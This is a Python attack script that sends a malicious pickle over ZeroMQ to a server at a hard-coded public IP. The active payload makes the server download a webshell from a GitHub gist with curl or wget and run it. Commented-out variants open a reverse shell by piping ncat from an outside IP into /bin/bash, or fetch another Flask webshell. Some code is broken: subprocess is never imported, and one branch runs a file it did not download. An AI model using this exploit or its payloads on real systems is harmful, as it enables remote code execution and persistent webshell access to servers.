import pickle

import zmq
import pickle
import os
import platform
# iotIP = '172.23.155.209'
iotIP = "157.230.59.233"
port = 3003

context = zmq.Context()
print("Connecting to server...")
socket = context.socket(zmq.REQ)
# socket.connect ("tcp://localhost:%s" % port)
socket.connect("tcp://%s:%s" % (iotIP, port))
print("Sending request btyes via ZMQ client:")

# class exploit:
#     def __reduce__(self):
#         import os
#         #return(os.system,('pwd',))
#         return(os.system,('ncat 159.65.230.253 4444 | /bin/bash',))
# class exploit:
#     def __reduce__(self):
#         import os
#         #return(os.system,('pwd',))
#         return(os.system,('wget https://raw.githubusercontent.com/eslamelhadedy/flaskWebShellApp/refs/heads/main/flaskWebShellApp.py && python flaskWebShellApp.py',))   
class exploit:
    def __reduce__(self):
        if platform.system() == "Windows":
            # Use a properly formatted command for subprocess.run with shell=True
            command = 'curl -o webshell.py https://gist.githubusercontent.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd/raw/793038e79bb64c585049d6286aacec84c6d2d88e/webshell.py && python webshell.py'
            return (subprocess.run, (command, {"shell": True}))
        else:  # Assuming Linux/Unix (remote server)
            command = 'wget https://gist.githubusercontent.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd/raw/793038e79bb64c585049d6286aacec84c6d2d88e/webshell.py && python flaskWebShellApp.py'
            return (os.system, (command,))
# Serialize the exploit object
serialized = pickle.dumps(exploit())

# class exploit:
#     def __reduce__(self):
#         import os
#         return(os.system,('ls',))
#         #return(os.system,('wget https://gist.githubusercontent.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd/raw/793038e79bb64c585049d6286aacec84c6d2d88e/webshell.py && python flaskWebShellApp.py',))    
serilaized =pickle.dumps(exploit())

print(serilaized)

# with open('flaskWebShellApp.py', 'rb') as file:
#     dataStr = file.read()
#     dataStr = base64.b64encode(pickledata).decode('ascii')
#     orignalData = pickle.loads(base64.b64decode(dataStr))
#     loaded_data = pickle.load(dataStr)

pickledata = pickle.dumps({"TEST_MD":exploit()}, protocol=pickle.HIGHEST_PROTOCOL)
#pickledata = pickle.dumps({"TEST_MD":exploit()}, protocol=pickle.HIGHEST_PROTOCOL)
print(str(pickledata))
socket.send(pickledata)
#  Get the reply.
replyData = socket.recv()
print("received reply bytes:")
print(str(replyData))
reqDict = pickle.loads(replyData)
print("Received reply: \n %s" % str(reqDict))